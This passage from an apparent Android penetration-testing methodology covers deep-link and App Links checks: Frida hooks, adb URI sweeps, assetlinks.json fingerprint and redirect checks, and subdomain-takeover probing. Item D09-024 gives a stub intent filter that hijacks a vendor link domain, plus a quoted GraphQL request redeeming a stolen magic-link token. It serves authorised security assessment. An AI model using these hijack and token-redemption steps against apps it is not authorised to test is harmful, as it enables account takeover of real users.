  finding; the plugin return value is.
- **Escalation:** → D10 bridge inventory and `_capacitor_file_` arbitrary read; → D11 token exfiltration →
  D13. A non-localhost `server.url` shipped in a release build is its own Critical (the app body is fetched
  over the network into a fully bridged WebView) → D17.
- **Ruled out when:** `allow-navigation` is restricted to owned origins with no wildcard and no `data:`,
  `server.url` is absent or localhost, and no `appUrlOpen` handler assigns to `window.location`. Paste
  `config.xml`/`capacitor.config.json` as the negative.

### D09-012 · Runtime handler discovery — hook `Intent.getData()` with a stack trace

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — instrumentation that converts an enumerated scheme into a proven sink |
| **Attacker** | AM-12 own device (evidence tool, not an attack) |
| **Applies to** | all; requires a Frida-capable device (D26) |
| **Maps to** | MASTG-TECH-0173 (Monitoring Deep Link Handlers at Runtime with Frida); MASTG-TOOL-0032 (Frida CodeShare — "Android Deep Link Observer", `@leolashkevych/android-deep-link-observer`); MASTG-DEMO-0152 |

- **Test:** Stop guessing parameter names. Observe every URI the app consumes *and constructs*, and — the
  whole point — get the **caller** via a stack trace so you know which class to read in jadx.
- **How:**
  ```javascript
  // d09-observer.js
  Java.perform(function () {
    var Intent = Java.use('android.content.Intent');
    var Uri    = Java.use('android.net.Uri');
    var Log    = Java.use('android.util.Log');
    var Exc    = Java.use('java.lang.Exception');

    Intent.getData.implementation = function () {
      var uri = this.getData();
      var act = this.getAction() !== null ? this.getAction().toString() : '<null action>';
      console.log('\n[*] Intent.getData()  action=' + act);
      try { console.log('[*] Activity: ' + this.getComponent().getClassName()); } catch (e) {}
      if (uri !== null) {
        console.log('    scheme:   ' + uri.getScheme());
        console.log('    host:     ' + uri.getHost());
        console.log('    path:     ' + uri.getPath());
        console.log('    query:    ' + uri.getQuery());
        console.log('    fragment: ' + uri.getFragment());
      } else { console.log('[-] No data supplied.'); }
      console.log(Log.getStackTraceString(Exc.$new()));   // the caller is the finding
      return uri;
    };

    // the construction side — catches tokens the app EMITS (D09-005)
    Intent.setData.overload('android.net.Uri').implementation = function (u) {
      console.log('[*] Intent.setData: ' + u);
      return this.setData(u);
    };

    Uri.getQueryParameter.implementation = function (k) {
      var v = this.getQueryParameter(k);
      console.log('[*] getQueryParameter(' + k + ') -> ' + v);
      return v;
    };
  });
  ```
  ```bash
  frida -U -f com.target.app -l d09-observer.js --no-pause
  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://load.html/?message=ok#part1" com.target.app
  ```
- **Proof:** The MASTG-TECH-0173 output shape — scheme, host, params, fragment — **plus** a stack frame naming
  the file, class and method that consumed it (e.g. `WebViewActivity.kt`, `…WebViewActivity`, `onCreate`).
  That frame is the jadx entry point for D09-041.
- **Escalation:** Every resolved handler becomes a D09-041 route-table row; every `setData` line carrying a
  token becomes a D09-005 candidate.
- **Ruled out when:** The hook fires and shows the URI being read and discarded (no downstream call), or the
  app never calls `getData()` for a fired link because the route is handled from `getIntent().getExtras()`
  instead — in which case re-run the hook on `Intent.getStringExtra`. Instrumentation that produced no output
  is a harness failure, not a negative.

### D09-013 · Fire the whole URI corpus and record where each one lands

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — candidate generation for D09-059 onwards |
| **Attacker** | AM-03 (discovery only — re-prove per D09-076) |
| **Applies to** | all |
| **Maps to** | repository harness `tools/07-deeplink-sweep.sh`; drozer `app.activity.start --data-uri`; MASTG-TECH-0173 |

- **Test:** Mechanically fire every declared URI plus its mutation set, recording the resolved activity for
  each. The deliverable is the list of URIs that land in a WebView or a state-changing screen.
- **How:**
  ```bash
  # build uris.txt from the D09-001 table, then mutate
  PKG=com.target.app
  tools/07-deeplink-sweep.sh "$PKG" uris.txt | tee /tmp/d09_sweep.txt
  wc -l uris.txt /tmp/d09_sweep.txt      # counts MUST match; a short output means the loop ate entries
  ```
  Do not iterate a file in a shell array — zsh array expansion fails silently and produces zero iterations
  with no error. Use Python for anything over five items:
  ```python
  import subprocess, time, sys
  uris = [l.strip() for l in open('uris.txt') if l.strip()]
  ok = 0
  for u in uris:
      try:
          subprocess.run(['adb','shell','am','start','-a','android.intent.action.VIEW',
                          '-c','android.intent.category.BROWSABLE','-d',u],
                         capture_output=True, timeout=20)
          time.sleep(3)
          top = subprocess.run(['adb','shell','dumpsys','activity','activities'],
                               capture_output=True, text=True, timeout=20).stdout
          line = next((l for l in top.splitlines() if 'topResumedActivity' in l), '')
          print(f'{u:70} -> {line.strip()}'); ok += 1
      except Exception as e:
          print(f'{u:70} -> ERROR {e}', file=sys.stderr)
  print(f'# fired {ok}/{len(uris)}', file=sys.stderr)     # count your results
  ```
- **Proof:** The URI → resolved activity table with matching input and output counts. `am start` result codes
  are part of the evidence: `3` = delivered, `-92 / Access blocked` = blocked by `enforceIntentFilter`,
  `102` = `BAL_BLOCK`.
- **Escalation:** Rows landing in a WebView go to D09-059; rows landing in a payment or settings screen go to
  D09-066; rows landing nowhere go to D09-073 (check for a crash).
- **Ruled out when:** Every URI in the corpus resolves to the app's launcher or a login screen and the counts
  match. A sweep whose output line count is lower than its input line count has ruled out nothing.

### D09-014 · `pm get-app-links` — the on-device verification state is the only truth

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | no VRT node for App Links — file the consequence: `server_security_misconfiguration.oauth_misconfiguration.insecure_redirect_uri` (varies) or `broken_access_control.exposed_sensitive_android_intent` (null); **Critical** as `broken_authentication_and_session_management.authentication_bypass` (P1) once you intercept a login link |
| **Attacker** | AM-03 (a competing app wins the chooser); AM-02 for the delivery of the link itself |
| **Applies to** | App Links exist from Android 6.0 (API 23); `pm get-app-links` / `pm verify-app-links` require **Android 12 (API 31)+** |
| **Maps to** | MASTG-TECH-0174 (Verifying App Link Website Association — documents the exact output shape and the "Common Reasons Verification Fails" list); MASTG-TEST-0393; MASWE-0029; `developer.android.com/training/app-links/verify-android-applinks` (compat change id **175408749** and the state vocabulary) |

- **Test:** `android:autoVerify="true"` is a *request*, not a result. The real state lives in the package
  manager, per host, per user. Anything other than `verified` means those links are not App Links at all and
  are claimable by any installed app.
- **How:**
  ```bash
  PKG=com.target.app
  adb shell pm get-app-links "$PKG"
  adb shell pm get-app-links --user cur "$PKG"
  adb shell dumpsys package "$PKG" | sed -n '/Domain verification state:/,/^$/p'
  adb shell dumpsys package domain-preferred-apps | grep -A5 "$PKG"
  # force a clean re-verification and re-read (the first read may be a cached failure)
  adb shell pm set-app-links --package "$PKG" 0 all
  adb shell pm verify-app-links --re-verify "$PKG"
  sleep 30 && adb shell pm get-app-links "$PKG"
  # for an app targeting below Android 12, enable the modern verifier first
  adb shell am compat enable 175408749 "$PKG"
  ```
  Or run the repository harness, which also fetches each host's statement file:
  ```bash
  tools/04-applink-verify.sh com.target.app
  ```
- **Proof:** The verbatim output with a host in a state other than `verified`. The documented vocabulary is
  `none`, `verified`, `approved`, `denied`, `migrated`, `restored`, `legacy_failure`, `system_configured`, and
  numeric codes **1024 and above** for device-verifier errors (e.g. `1026`). Shape:
  ```
  Domain verification state:
    example.com: verified
    sub.example.com: legacy_failure
    example.org: 1026
  ```
  Pair it with a competing stub app receiving the link to make the hijack demonstrated rather than inferred.
- **Escalation:** A non-verified host carrying an OAuth callback, magic link or reset token is D09-027 →
  D09-031 → D13 account takeover.
- **Ruled out when:** Every declared `autoVerify` host reports `verified` on a device running the app's
  minimum supported API level **and after** a forced `--re-verify`, and no custom scheme carries security
  material (D09-006 class (c) is empty). Paste the output. On devices below API 31 the command does not exist
  — say so and fall back to `dumpsys package domain-preferred-apps` plus the server-side check in D09-015
  rather than claiming a negative you did not observe.

### D09-015 · Fetch `assetlinks.json` for every declared host and diff the fingerprint

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | file the consequence — `broken_access_control.exposed_sensitive_android_intent` (null), or P1 `authentication_bypass` once the hijacked link carries a login token |
| **Attacker** | AM-03 |
| **Applies to** | all apps declaring `autoVerify` |
| **Maps to** | MASTG-TECH-0174; `developers.google.com/digital-asset-links/v1/getting-started` (statement structure); MASTG-TEST-0393; MASTG-TOOL-0123 (apksigner) |

- **Test:** The required statement shape is exact. Fetch it for **every** declared host — each subdomain needs
  its own file; `www.example.com` does not cover `mobile.example.com` — and compare the fingerprints against
  the certificate that actually signs the shipping APK.
  ```json
  [{
    "relation": ["delegate_permission/common.handle_all_urls"],
    "target": { "namespace": "android_app", "package_name": "com.example.app",
                "sha256_cert_fingerprints": ["AA:BB:…"] }
  }]
  ```
- **How:**
  ```bash
  PKG=com.target.app
  # what the APK is actually signed with
  apksigner verify --print-certs --verbose base.apk | grep -iE 'Signer #1 certificate SHA-256 digest|Verified using v'
  # every declared host
  for H in $(grep -ohE 'android:host="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u); do
    echo "== $H"
    curl -sSIL --max-time 10 "https://$H/.well-known/assetlinks.json" | grep -iE '^HTTP/|^location:|^content-type:'
    curl -sS   --max-time 10 "https://$H/.well-known/assetlinks.json" \
      | jq -r '.[] | [.relation[], .target.namespace, .target.package_name, (.target.sha256_cert_fingerprints//[]|join(","))] | @tsv' 2>/dev/null \
      || echo "   !! not valid JSON -> verification FAILS"
  done
  # Google's own view of the statement, which is what the on-device verifier consults
  curl -s "https://digitalassetlinks.googleapis.com/v1/statements:list?source.web.site=https://<host>&relation=delegate_permission/common.handle_all_urls" | jq .
  ```
- **Proof:** Three values side by side — the `sha256_cert_fingerprints` from the served JSON, the
  `Signer #1 certificate SHA-256 digest` from `apksigner`, and the on-device state from D09-014 — with the
  mismatch highlighted. A 404 or non-200 is equally decisive; record the exact status and any `Location`
  header.
- **Escalation:** → D09-026/-027 squat; the correct fingerprint also feeds the D03/D06 signature-permission
  analysis and the D18 API-key restriction check — capture it once and reuse it.
- **Ruled out when:** Every declared host serves a 200 `application/json` statement with no redirect hops,
  the namespace is `android_app`, the package name matches, and one of the listed fingerprints equals the
  shipping signer digest. Paste the `curl -sSIL` header block as evidence that there were no redirects.

### D09-016 · Play App Signing: the fingerprint you checked may be the wrong certificate

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | consequence-rated; the mechanism is a verifiable App Links break |
| **Attacker** | AM-03 |
| **Applies to** | every app distributed through Play with Play App Signing (the default for new apps since AAB-only publishing in August 2021) |
| **Maps to** | Play App Signing — upload key vs app signing key (support.google.com/googleplay/android-developer/answer/9842756); MASTG-TECH-0174 |

- **Test:** With Play App Signing the developer signs the bundle with the **upload key**, and Google re-signs
  the APKs users receive with the **app signing key**. If you compared `assetlinks.json` against the client's
  local build, you compared it against a certificate no user ever sees — and the classic real-world failure is
  the reverse: the statement lists the *upload* key, so verification fails for every real install while
  passing on the developer's machine.
- **How:**
  ```bash
  # what you were handed
  apksigner verify --print-certs apk/base.apk | grep -i 'SHA-256'
  # what users actually run — pull from a Play-installed copy on the device
  adb shell pm path com.target.app | sed 's/package://' | while read -r p; do adb pull "$p" store/; done
  apksigner verify --print-certs store/base.apk | grep -i 'SHA-256'
  # what the world is told to trust
  curl -s https://target.example/.well-known/assetlinks.json | jq -r '.[].target.sha256_cert_fingerprints[]'
  ```
  Ask the client for the **App signing key** SHA-256 from Play Console (*Protected with Play → Play Store
  distribution → Play app signing → App signing key*) and put it in the scoping sheet at P0.
- **Proof:** Three fingerprints in one table: handed artefact, store artefact, statement file. A mismatch
  between the statement and the **app signing key** is the finding; a mismatch between your artefact and the
  store artefact invalidates every signature-dependent conclusion you drew and must be corrected before you
  report anything in this chapter.
- **Escalation:** Wrong statement fingerprint → App Links never verify → D09-027 host squat → D13.
- **Ruled out when:** The store-pulled APK's signer digest appears in the statement's fingerprint list, or the
  app is not Play-distributed (sideloaded, enterprise, OEM preinstall) — say which, and say where the artefact
  came from.

### D09-017 · The Digital Asset Links failure taxonomy — redirects, transport, JSON, per-host files

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | consequence-rated (see D09-014) |
| **Attacker** | AM-03 |
| **Applies to** | all apps declaring `autoVerify` |
| **Maps to** | MASTG-TECH-0174 "Common Reasons Verification Fails"; `developer.android.com/training/app-links/verify-android-applinks` |

- **Test:** When `pm get-app-links` says a host is not verified, the report is only useful if you name the
  cause. The documented causes, each of which you can confirm from the wire:
  1. file missing (404 / 403);
  2. served over HTTP rather than HTTPS;
  3. **any redirect at all** — including `http`→`https` and apex→`www` — breaks verification;
  4. malformed JSON, or the wrong `namespace`/`package_name`;
  5. the fingerprint is absent or wrong (D09-015, D09-016);
  6. each declared host needs **its own** file — a parent domain's file does not cover a subdomain;
  7. a wildcard `*.example.com` host is verified against the **root** domain's file;
  8. a non-verifiable entry inside the same filter (D09-022, D09-021).
- **How:**
  ```bash
  H=app.target.example
  curl -sS -o /dev/null -w 'final=%{url_effective} code=%{http_code} redirects=%{num_redirects} type=%{content_type}\n' \
       -L "https://$H/.well-known/assetlinks.json"
  curl -sS -o /dev/null -w 'no-follow code=%{http_code}\n' "https://$H/.well-known/assetlinks.json"
  curl -sS -o /dev/null -w 'http code=%{http_code}\n' "http://$H/.well-known/assetlinks.json"
  curl -sS "https://$H/.well-known/assetlinks.json" | python3 -m json.tool > /dev/null && echo "JSON OK" || echo "JSON BROKEN"
  ```
- **Proof:** `num_redirects` greater than zero, or a non-200 on the direct (non-following) fetch, or a
  `content_type` that is not JSON, or the `python3 -m json.tool` failure — paired with the corresponding
  `pm get-app-links` state. Name the numbered cause in the report; a remediation the client can action is
  what makes this worth writing up at all.
- **Escalation:** Cause established → the hijack in D09-026/-027 becomes demonstrated rather than theoretical.
- **Ruled out when:** Direct fetch returns 200 with zero redirects, valid JSON, correct namespace and package,
  and a matching fingerprint, for **every** declared host individually. Paste one `-w` line per host.

### D09-018 · Wildcard or extra `package_name` in the statement file

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); P1 `authentication_bypass` if the over-trusted package can reach a login link |
| **Attacker** | AM-03, AM-08 |
| **Applies to** | all apps declaring `autoVerify` |
| **Maps to** | `developers.google.com/digital-asset-links/v1/getting-started`; repository harness `tools/04-applink-verify.sh` ("a `package_name` in assetlinks.json that is not the app -> over-broad trust") |

- **Test:** The statement is an allow-list of packages permitted to handle the domain's URLs. Read every
  entry, not just the first. Extra entries — a retired app, a white-label build, an agency's test package, a
  partner's package — are all granted the same domain-handling right, and one of them may be installable by
  anyone or abandoned.
- **How:**
  ```bash
  curl -s https://target.example/.well-known/assetlinks.json \
    | jq -r '.[] | "\(.relation[]) | \(.target.namespace) | \(.target.package_name) | \(.target.sha256_cert_fingerprints|length) fp"'
  # then check each extra package: does it still exist, and who ships it?
  curl -s -o /dev/null -w '%{http_code}\n' "https://play.google.com/store/apps/details?id=<extra.package>"
  ```
- **Proof:** The statement listing a `package_name` that is not the target app, plus evidence about that
  package: not present on Play (so the identifier is **claimable by anyone who publishes it**), or published
  by a third party, or a known-abandoned build. That is an over-broad trust grant on the client's own domain.
- **Escalation:** A claimable package name in the statement is a permanent App-Link hijack with no chooser —
  → D13 if the domain carries auth links; → D01 for the org's wider app inventory.
- **Ruled out when:** Every `package_name` in every statement entry is a current, first-party, Play-published
  package with a fingerprint the client can account for. List them.

### D09-019 · Stale `sha256_cert_fingerprints` after a signing-key rotation

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | consequence-rated; the retired key remains trusted for domain handling |
| **Attacker** | AM-03 (with the retired key), AM-08 |
| **Applies to** | apps that have rotated a signing key, used Play key upgrade, or migrated between publishers |
| **Maps to** | repository harness `tools/04-applink-verify.sh` ("a stale sha256 fingerprint (old signing key still trusted)"); MASTG-TECH-0174 |

- **Test:** Statements accumulate fingerprints; nobody removes them. A fingerprint that corresponds to a
  retired signing key means anything signed with that key still verifies as the owner of the domain. If the
  old key ever left the client's control — an outsourced build, a former agency, a leaked keystore — the
  domain is claimable today.
- **How:**
  ```bash
  curl -s https://target.example/.well-known/assetlinks.json | jq -r '.[].target.sha256_cert_fingerprints[]' | sort -u > /tmp/trusted.txt
  apksigner verify --print-certs store/base.apk | grep -i 'SHA-256' | awk '{print $NF}' | tr 'a-f' 'A-F' > /tmp/current.txt
  comm -23 /tmp/trusted.txt /tmp/current.txt      # fingerprints trusted but not shipping
  wc -l /tmp/trusted.txt /tmp/current.txt
  # historical builds tell you which key was which
  # (pull older releases from a mirror's version-history page, then:)
  for a in old/*.apk; do echo "$a"; apksigner verify --print-certs "$a" | grep -i 'SHA-256'; done
  ```
- **Proof:** A trusted fingerprint that matches an **older** APK's signer and not the current one, with both
  `apksigner` outputs shown. Ask the client directly whether that key is retired and where it lives; the
  answer belongs in the report.
- **Escalation:** → D02 signing and build integrity; → D09-026 if the old key is reachable.
- **Ruled out when:** Every trusted fingerprint corresponds to a currently-shipping signer (v1/v2/v3 rotation
  lineage counts — check `apksigner verify --print-certs --verbose` for the full lineage), or the client
  confirms in writing that each listed key is current. Record the confirmation.

### D09-020 · A statement host the vendor no longer owns, or a dangling subdomain

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_security_misconfiguration.misconfigured_dns.subdomain_takeover` (P3) for the takeover itself, chaining to P1 `authentication_bypass` when the taken-over host serves the statement that grants link handling |
| **Attacker** | AM-01 for the takeover, AM-02 for the link delivery |
| **Applies to** | all apps with more than one declared host, especially wildcard hosts |
| **Maps to** | repository harness `tools/04-applink-verify.sh` ("an entry for a subdomain the vendor no longer controls -> takeover -> link hijack"); Oversecured "Domain Takeover via Expired Whitelist Entry" ("Static analysis cannot know that a domain has expired") |

- **Test:** Static analysis structurally cannot find this. A host in the manifest — or a CNAME behind it — may
  point at a decommissioned bucket, a retired SaaS tenant or a lapsed registration. Whoever claims it serves
  both the app's link traffic *and* the `assetlinks.json` that authorises a package to handle it.
- **How:**
  ```bash
  for H in $(grep -ohE 'android:host="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sed 's/^\*\.//' | sort -u); do
    printf '%-40s ' "$H"
    CN=$(dig +short CNAME "$H" | tr -d '\n'); A=$(dig +short A "$H" | head -1)
    HTTP=$(curl -s -o /dev/null -w '%{http_code}' --max-time 8 "https://$H/" || echo ERR)
    REG=$(whois "$(echo "$H" | awk -F. '{print $(NF-1)"."$NF}')" 2>/dev/null | grep -icE 'expir|paid-till|no match|not found')
    echo "cname=${CN:--} a=${A:--} http=$HTTP whois-hits=$REG"
  done
  # NXDOMAIN + a CNAME to a SaaS provider, or a provider 404 fingerprint, is the takeover signal
  ```
  Do the same for every host that appears in the **code** allow-list (D09-056) and every host in the statement
  file itself.
- **Proof:** An `NXDOMAIN` target behind a live CNAME, or a provider's unclaimed-resource page, plus the
  manifest/statement line that trusts it. **Do not register a third party's domain to prove this** — the
  registrar's availability record plus the DNS chain is sufficient evidence and stays inside scope.
- **Escalation:** Takeover → serve `assetlinks.json` naming your own package → permanent, chooser-free App
  Link hijack → D13. Also feeds D09-056 (the same host is often in the code allow-list too) and D18.
- **Ruled out when:** Every declared and statement-listed host resolves to infrastructure the client
  acknowledges owning, and no wildcard host admits a subdomain outside their DNS zone. List the hosts and the
  resolution you observed.

### D09-021 · Pre-Android-12 verification poisoning: one bad filter de-verifies every host

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | consequence-rated |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY** — devices below Android 12 (API 31). State the app's `minSdkVersion` when reporting |
| **Maps to** | MASTG-TEST-0393 / MASTG-KNOW-0019, verbatim: "a single non-verifiable link (for example, a missing `autoVerify`, an invalid Digital Asset Links file, or a custom URL scheme in a verified intent filter) can cause the system to skip verification for **all** of the app's App Links" |

- **Test:** On pre-12 devices verification was all-or-nothing across the app. One dead subdomain, one
  forgotten `http` filter, or one custom scheme in a verified filter voids App Link protection for **every**
  host the app declares — including the ones whose statement files are perfect.
- **How:**
  ```bash
  aapt dump badging base.apk | grep -E 'sdkVersion|targetSdkVersion'
  # every autoVerify filter and every scheme inside it
  python3 - <<'PY'
  import re
  m = open('out/AndroidManifest.merged.xml').read()
  for f in re.findall(r'<intent-filter[^>]*autoVerify="true".*?</intent-filter>', m, re.S):
      print('SCHEMES:', re.findall(r'android:scheme="([^"]+)"', f),
            'HOSTS:', re.findall(r'android:host="([^"]+)"', f))
  PY
  ```
  Then demonstrate the split on two devices — one at the app's `minSdkVersion`, one at API 31+:
  ```bash
  adb -s emulator-5554 shell dumpsys package domain-preferred-apps | grep -A5 com.target.app   # pre-12
  adb -s emulator-5556 shell pm get-app-links com.target.app                                   # 12+
  ```
- **Proof:** On the pre-12 device, the https link producing a disambiguation chooser (or your stub winning)
  for a host whose `assetlinks.json` is correct — with the poisoning filter quoted. On the API 31+ device the
  same host verifies. That contrast *is* the finding.
- **Escalation:** Restores the full D09-027 surface on every device below 12 in the app's supported range.
- **Ruled out when:** The app's `minSdkVersion` is 31 or higher, or no `autoVerify` filter contains a
  non-http(s) scheme and every declared host verifies. Quote the `minSdkVersion` from `apktool.yml` or
  `dumpsys package` — `apktool` frequently drops `<uses-sdk>` from the decoded manifest, so do not read it
  from there.

### D09-022 · A custom scheme declared inside an `autoVerify` intent filter

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | consequence-rated |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY** effect below API 31; the unverifiable scheme itself is current at every API level |
| **Maps to** | MASTG-KNOW-0019; MASTG-TECH-0174; MASTG-TEST-0393 |

- **Test:** A custom scheme can never be auto-verified. Putting one in the same filter as the verified https
  data elements does two things: pre-12 it voids verification for the whole app (D09-021), and at every API
  level it creates an unverifiable alias onto the *same handler* that the verified link protects — combined
  with the `<data>` cross-product (D09-002), the handler is reachable on `myapp://verified.host/path`.
- **How:**
  ```bash
  xmlstarlet sel -t -m "//intent-filter[@android:autoVerify='true']" -o "filter:" \
    -m "data" -o " scheme=" -v "@android:scheme" -o " host=" -v "@android:host" -b -n \
    out/AndroidManifest.merged.xml 2>/dev/null \
  || python3 - <<'PY'
  import re
  m=open('out/AndroidManifest.merged.xml').read()
  for f in re.findall(r'<intent-filter[^>]*autoVerify="true".*?</intent-filter>', m, re.S):
      sch=set(re.findall(r'android:scheme="([^"]+)"', f))
      if sch - {'http','https'}: print('MIXED FILTER schemes=', sch, 'hosts=', re.findall(r'android:host="([^"]+)"', f))
  PY
  # then reach the protected handler over the unverifiable alias
  adb shell am start -W -a android.intent.action.VIEW -d "myapp://app.target.example/reset?token=X" com.target.app
  ```
- **Proof:** The mixed filter quoted, plus `am start -W` returning `Status: ok` with the App-Link-protected
  activity resolved on the custom-scheme alias — and `pm get-app-links` showing the hosts unverified on a
  pre-12 device.
- **Escalation:** The alias is a class (c) entry point in the D09-006 table, so every interception item
  applies to it regardless of how well the https side is verified.
- **Ruled out when:** No `autoVerify` filter contains a non-http(s) `<data android:scheme>`. Paste the
  extraction output.

### D09-023 · Re-verification cadence — write the remediation-verification clause correctly

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — report-quality item that decides whether your retest is valid |
| **Attacker** | n/a |
| **Applies to** | all; behaviour differs on Android 15 (API 35)+ versus Android 14 and lower |
| **Maps to** | `developer.android.com/training/app-links/verify-android-applinks` — Android 15+ periodically re-verifies in the background and an `assetlinks.json` change "can take up to 7 days to propagate"; Android 14 and lower do not re-verify periodically |

- **Test:** Two traps. (1) You fix-verify too early: on Android 15+ the client's corrected statement file may
  take up to a week to propagate, so a retest the next day "fails" for the wrong reason. (2) You fix-verify
  too late: on Android 14 and lower there is **no periodic re-verification at all**, so a stale statement
  keeps working — and a corrected one keeps *not* working — until the app is installed or updated. A device
  that verified under the old file stays verified.
- **How:**
  ```bash
  # force the re-check rather than waiting, and record the device release
  adb shell getprop ro.build.version.release; adb shell getprop ro.build.version.sdk
  adb shell pm set-app-links --package com.target.app 0 all
  adb shell pm verify-app-links --re-verify com.target.app
  sleep 30 && adb shell pm get-app-links com.target.app
  # and on a pre-15 device, prove the install-time binding
  adb uninstall com.target.app && adb install store/base.apk && adb shell pm get-app-links com.target.app
  ```
- **Proof:** The verification state before and after a forced re-verify, with the device release and SDK
  recorded next to each. In the report's remediation section state: "re-verify on a device at API *n*, after
  a reinstall on Android ≤14, and allow up to 7 days for background propagation on Android 15+."
- **Escalation:** n/a — this is what stops a valid finding being closed as "already fixed" or reopened
  incorrectly.
- **Ruled out when:** n/a — this clause belongs in every App Links finding you file.

### D09-024 · Third-party link domains: curl the SDK's `assetlinks.json`, not only the client's

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the hijacked link is a magic link |
| **Attacker** | AM-03 |
| **Applies to** | any app using Branch (`*.app.link`), AppsFlyer (`*.onelink.me`), Adjust (`*.go.link`), Firebase Dynamic Links or a similar link-shortening/attribution service |
| **Maps to** | H1 **#855618** (Shopify Arrive — magic-link ATO over an unverified Branch `app.link` domain, rated **Low** by the vendor despite full ATO) |

- **Test:** The app registers the *vendor's* domain in its manifest, but the statement file on that domain is
  served by the vendor and frequently does not list the client's package or fingerprint — or is empty, or
  404s. The client's security team never looks because "that's not our domain". This is the single most
  recurring assetlinks failure in the corpus.
- **How:**
  ```bash
  # every non-first-party host the manifest claims
  grep -ohE 'android:host="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u \
    | grep -iE 'app\.link|onelink\.me|go\.link|page\.link|bnc\.lt|adj\.st|smart\.link|tinyurl|lnk\.to'
  for H in <those hosts>; do
    echo "== $H"; curl -s -o /tmp/al.json -w 'code=%{http_code} type=%{content_type}\n' "https://$H/.well-known/assetlinks.json"
    jq -r '.[].target | "\(.package_name) \(.sha256_cert_fingerprints|length)fp"' /tmp/al.json 2>/dev/null || cat /tmp/al.json | head -5
  done
  adb shell pm get-app-links com.target.app | grep -iE 'app\.link|onelink|go\.link|page\.link'
  ```
  Then claim it from the stub:
  ```xml
  <intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="https"/><data android:host="qvay.app.link"/>
  </intent-filter>
  ```
- **Proof:** The vendor domain's statement returning 404 or an empty array, or listing a different package,
  plus `pm get-app-links` reporting it unverified, plus your stub receiving the magic-link token in
  `getIntent().getData()` — and then **redeeming it**. Shopify's report redeemed it as a GraphQL mutation and
  received a valid session cookie:
  ```http
  POST /graphql HTTP/1.1
  Host: arrive-server.shopifycloud.com
  {"operationName":"VerifyToken","variables":{"token":"TOKENHERE"},"query":"mutation VerifyToken($token: String!){verifyToken(token:$token){user{id}}}"}
  ```
- **Escalation:** → D13 full ATO. Pre-empt the vendor's downgrade the way #855618's "Bonus" section did:
  show that the malicious app can **trigger the login email itself** (call the app's own
  `sendVerificationEmail`-equivalent endpoint), which removes the wait-for-the-user precondition and with it
  the main argument for rating it Low.
- **Ruled out when:** Every third-party link host verifies on device and its statement lists the client's
  package with the shipping fingerprint, or the app declares no third-party link domain. Paste the vendor
  domain's statement.

### D09-025 · `assetlinks.json` relation confusion: link handling versus credential sharing

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) if a passkey origin binds to a host outside the client's control |
| **Attacker** | AM-03, AM-09 |
| **Applies to** | apps using Credential Manager passkeys, or sharing credentials between an app and a website |
| **Maps to** | `developers.google.com/digital-asset-links/v1/getting-started` (both relation strings); `developer.android.com/identity/sign-in/credential-manager` ("Passkeys are bound to your app's origin via assetlinks.json") |

- **Test:** Two distinct relations live in the same file: `delegate_permission/common.handle_all_urls`
  governs App Link handling, `delegate_permission/common.get_login_creds` governs credential and passkey
  sharing. Confusing them silently breaks one of them. Two failures to look for: a passkey/credential relation
  delegating to a host the client does not control, and a `handle_all_urls` entry present where only
  credential sharing was intended (or the reverse, which is why App Links "mysteriously" stopped verifying).
- **How:**
  ```bash
  curl -s https://target.example/.well-known/assetlinks.json \
    | jq -r '.[] | "\(.relation|join(",")) :: \(.target.namespace) :: \(.target.package_name // .target.site)"'
  grep -rn 'CredentialManager\|CreatePublicKeyCredentialRequest\|GetPublicKeyCredentialOption\|androidx.credentials' out/sources/ | head
  # what origin does the app actually request?
  grep -rn '"rp"\|rpId\|relying' out/sources/ out/assets 2>/dev/null | head
  adb shell pm verify-app-links --re-verify com.target.app && adb shell pm get-app-links com.target.app
  ```
- **Proof:** A `get_login_creds` (or `handle_all_urls`) entry whose `target.site` or `package_name` is outside
  the client's control, or a passkey `rpId` that does not match any relation in the served statement — quoted
  from both the file and the app.
- **Escalation:** → D13 authentication; a mis-scoped relying-party origin is a credential-sharing grant to a
  third party, not a deep-link nit.
- **Ruled out when:** Each relation entry names only client-controlled targets and the app's relying-party
  identifier matches. If the app does not use Credential Manager at all, say so and close the item.

### D09-026 · Custom-scheme squat from the zero-permission attacker app

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the captured value completes a login; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for the token itself; `broken_access_control.exposed_sensitive_android_intent` (null) when it captures something less |
| **Attacker** | AM-03 |
| **Applies to** | all custom (non-http/https) schemes, every Android version. Custom schemes have **no** ownership verification and never have |
| **Maps to** | MASTG-TEST-0393; MASWE-0029 (CWE-939, CWE-917); ATT&CK **T1635.001 URI Hijacking** ("Applications regularly register URIs with the operating system to act as a response handler for various actions, such as logging into an app using an external account via single sign-on"), mitigations M1013/M1006; Google Play ASI "Scheme Hijacking" campaign; MASTG-KNOW-0019 ("Unlike iOS, Android provides no mechanism to identify which app sent the Intent") |

- **Test:** Declare the target's scheme in your own app and see what arrives. This is the base primitive for
  every interception item below. Do it with the repository's zero-permission probe app so the manifest itself
  is the AM-03 evidence.
